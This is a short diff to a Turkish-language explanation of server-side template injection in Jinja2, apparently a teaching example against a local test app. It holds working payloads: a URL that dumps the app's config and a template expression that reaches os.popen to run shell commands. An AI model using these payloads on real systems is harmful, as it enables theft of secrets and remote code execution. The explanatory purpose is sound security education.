@@ -6,3 +6,5 @@ Bu, Jinja2 template engine’in kullanıcı girdisini şablon gibi işlediğini 
 Kötü niyetli biri bunun yerine şunu da deneyebilir:
 - http://localhost:5000/?name={{config.items()}}
 
+-Bu açık sayesinde: Gizli yapılandırma bilgilerine erişilebilir.
+- Daha ileri düzeyde kod çalıştırma yapılabilir: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }} gibi komutlarla shell erişimi bile sağlanabilir.
